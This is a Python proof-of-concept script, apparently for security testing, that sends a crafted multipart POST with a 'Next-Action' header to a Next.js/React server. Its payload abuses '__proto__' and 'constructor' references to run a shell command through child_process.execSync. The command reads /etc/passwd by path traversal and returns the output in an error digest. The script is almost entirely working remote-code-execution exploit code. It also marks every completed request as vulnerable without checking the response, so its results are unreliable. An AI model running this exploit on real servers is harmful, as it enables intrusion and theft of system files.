import argparse
import json
import sys
import requests

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True)
    args = parser.parse_args()

    with open(args.input, "r", encoding="utf-8") as f:
        payload = json.load(f)

    base_url = payload["base_url"]
    stack_name = payload["stack_name"]

    print(f"[DEBUG] target={base_url}", file=sys.stderr)
    print(f"[DEBUG] stack_name={stack_name}", file=sys.stderr)

    try:
        command = "cat ../../../../../../../../../../../../../../etc/passwd"

        payload = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then": "$B0"}',
            "_response": {
                "_formData": {
                    "get": "$1:constructor:constructor",
                },
                "_prefix": f"var res = process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            },
        }
                                    
        files = {
            "0": (None, json.dumps(payload)),
            "1": (None, '"$@0"'),
        }

        headers = {
            "Next-Action": "x",
            "User-Agent": "SecurityResearch-PoC/test",
        }

        response = requests.post(base_url, headers=headers, files=files, timeout=3)
        
        result = {
            "poc_name": "react_test",
            "status": "Completed",
            "description": "check directory f,  react , next.js 버전 업데이트 필요",
            "evidence": f"HTTP {response.status_code}",
            "raw_output": response.text[:500],
            "vulnerable": True,
        }
    except Exception as e:
        result = {
            "poc_name": "react_test",
            "status": "Error",
            "description": "PoC execution failed.",
            "evidence": str(e),
            "raw_output": "",
            "vulnerable": False,
        }

    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()